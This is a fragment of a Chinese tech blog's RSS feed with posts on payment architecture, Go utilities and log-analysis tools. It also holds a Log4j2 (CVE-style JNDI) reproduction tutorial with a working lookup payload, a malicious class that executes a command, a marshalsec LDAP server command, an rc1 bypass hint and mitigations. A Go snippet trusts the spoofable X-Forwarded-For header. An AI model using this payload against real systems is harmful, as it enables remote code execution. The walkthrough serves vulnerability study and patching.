&lt;p&gt;幂等 &amp;amp; 异常补偿&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220626.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;对账&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220636.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;准实时对账&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220647.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;DB拆分&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220656.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;异步化&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;支付是整个交易链路的核心环节，那么，怎么兼顾支付系统的稳定性和执行效率呢？是异步化。&lt;/p&gt;
&lt;p&gt;消息异步化&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220707.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;外部支付调用异步化&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220720.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在外部支付中，经常需要服务方与第三方支付交互，获取预支付凭证，如上图所示。&lt;/p&gt;
&lt;p&gt;这种同步调用的情况下，由于需要跨外部网络，响应的 RT 会非常长，可能会出现跨秒的情况。由于是同步调用，会阻塞整个支付链路。一旦 RT 很长且 QPS 比较大的情况下，服务会整体 hold 住，甚至会出现拒绝服务的情况。&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220747.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此，可以拆分获取凭证的操作，通过独立网关渠道前置服务，将获取的方式异步化，从前置网关获取内部凭证，然后由前置网关去异步调用第三方。&lt;/p&gt;
&lt;p&gt;异步并行化&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220759.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;资金核算异步化&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220812.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;热点账户账务单独处理&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220823.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;记账事务切分&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220833.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;4.生产实践&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;性能压测&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;构建压测模型，模拟现实真实场景；压测数据进影子库，正常业务无侵入；单机性能和集权链路都不能忽视；识别系统稳定性和容量配比。。。&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220847.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;稳定性治理&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220858.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;核心链路分离&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220908.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;服务依赖降级&lt;br&gt;&lt;img src=&#34;/img/202304/20230605220918.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/0hxHkAoL47Fv6EKAleedAg&#34;&gt;https://mp.weixin.qq.com/s/0hxHkAoL47Fv6EKAleedAg&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2023/01/11/hand-and-hand-log4j/</guid>
            <title>手把手教你复现 Log4j2 漏洞</title>
            <link>https://erik.xyz/2023/01/11/hand-and-hand-log4j/</link>
            <category>漏洞</category>
            <category>log4j2</category>
            <pubDate>Wed, 11 Jan 2023 22:19:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;h4 id=&#34;1-简介&#34;&gt;&lt;a href=&#34;#1-简介&#34; class=&#34;headerlink&#34; title=&#34;1.简介&#34;&gt;&lt;/a&gt;1.简介&lt;/h4&gt;&lt;p&gt;ApacheLog4j2是一个开源的Java日志框架，被广泛地应用在中间件、开发框架与Web应用中。&lt;/p&gt;
&lt;h4 id=&#34;2-漏洞概述&#34;&gt;&lt;a href=&#34;#2-漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;2.漏洞概述&#34;&gt;&lt;/a&gt;2.漏洞概述&lt;/h4&gt;&lt;p&gt;该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;3-影响范围&#34;&gt;&lt;a href=&#34;#3-影响范围&#34; class=&#34;headerlink&#34; title=&#34;3.影响范围&#34;&gt;&lt;/a&gt;3.影响范围&lt;/h4&gt;&lt;p&gt;Apache Log4j 2.x &amp;lt;= 2.15.0-rc1&lt;/p&gt;
&lt;h4 id=&#34;4-环境搭建&#34;&gt;&lt;a href=&#34;#4-环境搭建&#34; class=&#34;headerlink&#34; title=&#34;4.环境搭建&#34;&gt;&lt;/a&gt;4.环境搭建&lt;/h4&gt;&lt;p&gt;1、创建一个新的maven项目，并导入Log4j的依赖包&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h5&gt;&lt;p&gt;1、使用POC测试&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import org.apache.logging.log4j.LogManager;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       import org.apache.logging.log4j.Logger;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       class LogTest &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           public static final Logger logger = LogManager.getLogger();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           public static void main(String[] args) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               logger.error(&amp;quot;$&amp;#123;jndi:ldap://localhost:8888/Exploit&amp;#125;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2、编译一恶意类Exploit.class&lt;/p&gt;
&lt;p&gt;首先新建exp.java，然后编译为class文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class Exploit &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.err.println(&amp;quot;Pwned&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String cmds = &amp;quot;calc&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime.getRuntime().exec(cmds);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch ( Exception e ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javac exp.java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3、使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;http://127.0.0.1:7777/#Exploit&amp;quot; 8888&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;/img/202301/20230211220751.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;4、运行poc.java，即可访问恶意类并执行写在其中的”calc”命令 &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/202301/20230211221053.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据”?Type=A Type&amp;amp;Name=1100110&amp;amp;Char=!”可绕过rc1，RC2版本对此异常进行了捕获。&lt;br&gt;&lt;img src=&#34;/img/202301/20230211221141.png&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;5-修复方式&#34;&gt;&lt;a href=&#34;#5-修复方式&#34; class=&#34;headerlink&#34; title=&#34;5.修复方式&#34;&gt;&lt;/a&gt;5.修复方式&lt;/h4&gt;&lt;p&gt;目前，Apache官方已发布新版本完成漏洞修复，建议用户尽快进行自查，并及时升级至最新版本：&lt;a href=&#34;https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2&#34;&gt;https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2&lt;/a&gt; 建议同时采用如下临时措施进行漏洞防范：&lt;/p&gt;
&lt;p&gt;1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；&lt;/p&gt;
&lt;p&gt;2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；&lt;/p&gt;
&lt;p&gt;3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；&lt;/p&gt;
&lt;p&gt;4）部署使用第三方防火墙产品进行安全防护。&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&#34;https://blog.csdn.net/qq_40989258/article/details/121862363&#34;&gt;https://blog.csdn.net/qq_40989258/article/details/121862363&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2022/05/22/go-add-pdf/</guid>
            <title>go中生成PDF</title>
            <link>https://erik.xyz/2022/05/22/go-add-pdf/</link>
            <category>go中pdf生成</category>
            <pubDate>Sun, 22 May 2022 10:57:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;一个简单但是非常实用的pdf生成器！&lt;/p&gt;
&lt;p&gt;安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;go get github.com/jung-kurt/gofpdf
&lt;/code&gt;&lt;/pre&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package main

import (
    &amp;quot;github.com/jung-kurt/gofpdf&amp;quot;
)

func main() &amp;#123;
    err := GeneratePdf(&amp;quot;hello.pdf&amp;quot;)
    if err != nil &amp;#123;
        panic(err)
    &amp;#125;
&amp;#125;

func GeneratePdf(filename string) error &amp;#123;
  pdf := gofpdf.New(&amp;quot;P&amp;quot;, &amp;quot;mm&amp;quot;, &amp;quot;A4&amp;quot;, &amp;quot;&amp;quot;)
  pdf.AddPage()
  pdf.SetFont(&amp;quot;Arial&amp;quot;, &amp;quot;B&amp;quot;, 16)
  pdf.CellFormat(190, 7, &amp;quot;Welcome to topgoer.com&amp;quot;, &amp;quot;0&amp;quot;, 0, &amp;quot;CM&amp;quot;, false, 0, &amp;quot;&amp;quot;)

  pdf.ImageOptions(
      &amp;quot;topgoer.png&amp;quot;,
      80, 20,
      0, 0,
      false,
      gofpdf.ImageOptions&amp;#123;ImageType: &amp;quot;PNG&amp;quot;, ReadDpi: true&amp;#125;,
      0,
      &amp;quot;&amp;quot;,
  )

  return pdf.OutputFileAndClose(filename)
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2022/05/10/get-http-address-ip/</guid>
            <title>go中获取HTTP请求的IP地址</title>
            <link>https://erik.xyz/2022/05/10/get-http-address-ip/</link>
            <category>go获取ip</category>
            <pubDate>Tue, 10 May 2022 20:12:31 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;pre&gt;&lt;code&gt;package main

import (
    &amp;quot;encoding/json&amp;quot;
    &amp;quot;net/http&amp;quot;
)

func main() &amp;#123;
    http.HandleFunc(&amp;quot;/&amp;quot;, ExampleHandler)
    if err := http.ListenAndServe(&amp;quot;:8080&amp;quot;, nil); err != nil &amp;#123;
        panic(err)
    &amp;#125;
&amp;#125;

func ExampleHandler(w http.ResponseWriter, r *http.Request) &amp;#123;
    w.Header().Add(&amp;quot;Content-Type&amp;quot;, &amp;quot;application/json&amp;quot;)
    resp, _ := json.Marshal(map[string]string&amp;#123;
        &amp;quot;ip&amp;quot;: GetIP(r),
    &amp;#125;)
    w.Write(resp)
&amp;#125;

func GetIP(r *http.Request) string &amp;#123;
    forwarded := r.Header.Get(&amp;quot;X-FORWARDED-FOR&amp;quot;)
    if forwarded != &amp;quot;&amp;quot; &amp;#123;
        return forwarded
    &amp;#125;
    return r.RemoteAddr
&amp;#125;
&lt;/code&gt;&lt;/pre&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2022/04/12/go-limit-open/</guid>
            <title>go中限流器</title>
            <link>https://erik.xyz/2022/04/12/go-limit-open/</link>
            <category>go中限流</category>
            <pubDate>Tue, 12 Apr 2022 13:12:54 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;限流器是后台服务中的非常重要的组件，可以用来限制请求速率，保护服务，以免服务过载。 限流器的实现方法有很多种，例如滑动窗口法、Token Bucket、Leaky Bucket等。&lt;/p&gt;
&lt;p&gt;其实golang标准库中就自带了限流算法的实现，即golang.org/x/time/rate。 该限流器是基于Token Bucket(令牌桶)实现的。&lt;/p&gt;
&lt;p&gt;简单来说，令牌桶就是想象有一个固定大小的桶，系统会以恒定速率向桶中放Token，桶满则暂时不放。 而用户则从桶中取Token，如果有剩余Token就可以一直取。如果没有剩余Token，则需要等到系统中被放置了Token才行。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;本文则主要集中介绍下该组件的具体使用方法：&lt;/p&gt;
&lt;p&gt;我们可以使用以下方法构造一个限流器对象：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;limiter := NewLimiter(10, 1);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有两个参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一个参数是r Limit。代表每秒可以向Token桶中产生多少token。Limit实际上是float64的别名。&lt;/li&gt;
&lt;li&gt;第二个参数是b int。b代表Token桶的容量大小。 那么，对于以上例子来说，其构造出的限流器含义为，其令牌桶大小为1, 以每秒10个Token的速率向桶中放置Token。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了直接指定每秒产生的Token个数外，还可以用Every方法来指定向Token桶中放置Token的间隔，例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;limit := Every(100 * time.Millisecond);
limiter := NewLimiter(limit, 1);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上就表示每100ms往桶中放一个Token。本质上也就是一秒钟产生10个。&lt;/p&gt;
&lt;p&gt;Limiter提供了三类方法供用户消费Token，用户可以每次消费一个Token，也可以一次性消费多个Token。 而每种方法代表了当Token不足时，各自不同的对应手段。&lt;/p&gt;
&lt;p&gt; Wait/WaitN &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func (lim *Limiter) Wait(ctx context.Context) (err error)
func (lim *Limiter) WaitN(ctx context.Context, n int) (err error)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Wait实际上就是WaitN(ctx,1)。&lt;/p&gt;
&lt;p&gt;当使用Wait方法消费Token时，如果此时桶内Token数组不足(小于N)，那么Wait方法将会阻塞一段时间，直至Token满足条件。如果充足则直接返回。&lt;/p&gt;
&lt;p&gt;这里可以看到，Wait方法有一个context参数。 我们可以设置context的Deadline或者Timeout，来决定此次Wait的最长时间。&lt;/p&gt;
&lt;p&gt;Allow/AllowN&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func (lim *Limiter) Allow() bool
func (lim *Limiter) AllowN(now time.Time, n int) bool
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Allow实际上就是AllowN(time.Now(),1)。&lt;/p&gt;
&lt;p&gt;AllowN方法表示，截止到某一时刻，目前桶中数目是否至少为n个，满足则返回true，同时从桶中消费n个token。 反之返回不消费Token，false。&lt;/p&gt;
&lt;p&gt;通常对应这样的线上场景，如果请求速率过快，就直接丢到某些请求。&lt;/p&gt;
&lt;p&gt; Reserve/ReserveN&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func (lim *Limiter) Reserve() *Reservation
func (lim *Limiter) ReserveN(now time.Time, n int) *Reservation
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reserve相当于ReserveN(time.Now(), 1)。&lt;/p&gt;
&lt;p&gt;ReserveN的用法就相对来说复杂一些，当调用完成后，无论Token是否充足，都会返回一个Reservation*对象。&lt;/p&gt;
&lt;p&gt;你可以调用该对象的Delay()方法，该方法返回了需要等待的时间。如果等待时间为0，则说明不用等待。 必须等到等待时间之后，才能进行接下来的工作。&lt;/p&gt;
&lt;p&gt;或者，如果不想等待，可以调用Cancel()方法，该方法会将Token归还。&lt;/p&gt;
&lt;p&gt;举一个简单的例子，我们可以这么使用Reserve方法。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;r := lim.Reserve()
f !r.OK() &amp;#123;
    // Not allowed to act! Did you remember to set lim.burst to be &amp;gt; 0 ?
    return
&amp;#125;
time.Sleep(r.Delay())
Act() // 执行相关逻辑
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; 动态调整速率&lt;/p&gt;
&lt;p&gt;Limiter支持可以调整速率和桶大小：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SetLimit(Limit) 改变放入Token的速率
SetBurst(int) 改变Token桶大小
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有了这两个方法，可以根据现有环境和条件，根据我们的需求，动态的改变Token桶大小和速率&lt;/p&gt;
&lt;p&gt;实例代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package main

import (
    &amp;quot;context&amp;quot;
    &amp;quot;log&amp;quot;
    &amp;quot;time&amp;quot;

    &amp;quot;golang.org/x/time/rate&amp;quot;
)

//limit表示每秒产生token数，buret最多存token数
//Allow判断当前是否可以取到token
//Wait阻塞等待知道取到token
//Reserve返回等待时间，再去取token

func main() &amp;#123;
    l := rate.NewLimiter(1, 5)
    log.Println(l.Limit(), l.Burst())
    for i := 0; i &amp;lt; 100; i++ &amp;#123;
        //阻塞等待直到，取到一个token
        log.Println(&amp;quot;before Wait&amp;quot;)
        c, _ := context.WithTimeout(context.Background(), time.Second*2)
        if err := l.Wait(c); err != nil &amp;#123;
            log.Println(&amp;quot;limiter wait err:&amp;quot; + err.Error())
        &amp;#125;
        log.Println(&amp;quot;after Wait&amp;quot;)

        //返回需要等待多久才有新的token,这样就可以等待指定时间执行任务
        r := l.Reserve()
        log.Println(&amp;quot;reserve Delay:&amp;quot;, r.Delay())

        //判断当前是否可以取到token
        a := l.Allow()
        log.Println(&amp;quot;Allow:&amp;quot;, a)
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2021/08/22/10-logs-tools-total/</guid>
            <title>10个Web日志安全性分析工具</title>
            <link>https://erik.xyz/2021/08/22/10-logs-tools-total/</link>
            <category>日志</category>
            <category>工具</category>
            <pubDate>Sun, 22 Aug 2021 21:30:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;首先，我们应该清楚的是，日志文件不仅可以帮助我们追踪入侵者的来源并找到其攻击路径，而且在正常的操作和维护中，日志还可以反映出许多安全攻击。&lt;br&gt;一个简单易用的Web日志分析工具可以大大提高效率。当前，行业中有许多日志分析工具。今天，我们推荐十种易于使用的Web日志安全性分析工具。&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;1.360星图&lt;/p&gt;
&lt;p&gt;一个非常易于使用的网站访问日志分析工具，可以有效地识别Web漏洞攻击，CC攻击，恶意爬网程序扫描，异常访问和其他行为。一键式自动分析，输出安全性分析报告，支持iis / apache / nginx日志，支持自定义格式。&lt;/p&gt;
&lt;p&gt;2.LogForensics&lt;/p&gt;
&lt;p&gt;TSRC提供的日志分析工具可以从单个可疑线索开始，并遍历所有可疑URL（CGI）和源IP。&lt;/p&gt;
&lt;p&gt;3.GoAccess&lt;/p&gt;
&lt;p&gt;可视化Web日志分析工具，可通过* nix系统下的Web浏览器或终端程序进行访问。它可以为系统管理员提供快速而有价值的HTTP统计信息，并以在线可视化服务器的形式显示它们。&lt;/p&gt;
&lt;p&gt;4.AWStats&lt;/p&gt;
&lt;p&gt;强大的开源日志分析系统，可以图形方式生成高级Web，流媒体，ftp或邮件服务器统计信息。&lt;/p&gt;
&lt;p&gt;5.Logstalgia&lt;/p&gt;
&lt;p&gt;一个非常酷的可视化日志分析工具，可以直观地显示CC攻击和网站的日志分析，并以可视化的3D效果显示它。&lt;/p&gt;
&lt;p&gt;6.FinderWeb&lt;/p&gt;
&lt;p&gt;程序员用于监视日志的工具，支持tail，less，grep，并支持大文本文件。从几个M到几十个G的日志文件都是平滑且免费的。&lt;/p&gt;
&lt;p&gt;7.web-log-parser&lt;/p&gt;
&lt;p&gt;使用python语言开发的开源Web日志分析工具，具有灵活的日志格式配置。&lt;/p&gt;
&lt;p&gt;8.ELK&lt;/p&gt;
&lt;p&gt;用于开源实时日志分析的ELK平台包含三个开源项目，即ElasticSearch，Logstash和Kiabana，在企业级日志管理平台中非常常见。&lt;/p&gt;
&lt;p&gt;9.Splunk&lt;/p&gt;
&lt;p&gt;顶级日志分析软件，如果您经常使用grep，awk，sed，sort，uniq，tail，head来分析日志，则可以轻松过渡到Splunk。&lt;/p&gt;
&lt;p&gt;10.IBM QRadar&lt;/p&gt;
&lt;p&gt;Qradar具有免费的社区版本，其功能与商业版本没有太大区别，适用于小型日志和流量分析。&lt;/p&gt;
&lt;p&gt;文章转载：乌云安全&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2021/07/15/linux-tools-system/</guid>
            <title>Linux 运维必备的13款实用工具</title>
            <link>https://erik.xyz/2021/07/15/linux-tools-system/</link>
            <category>工具</category>
            <pubDate>Thu, 15 Jul 2021 21:15:00 +0800</pubDate>
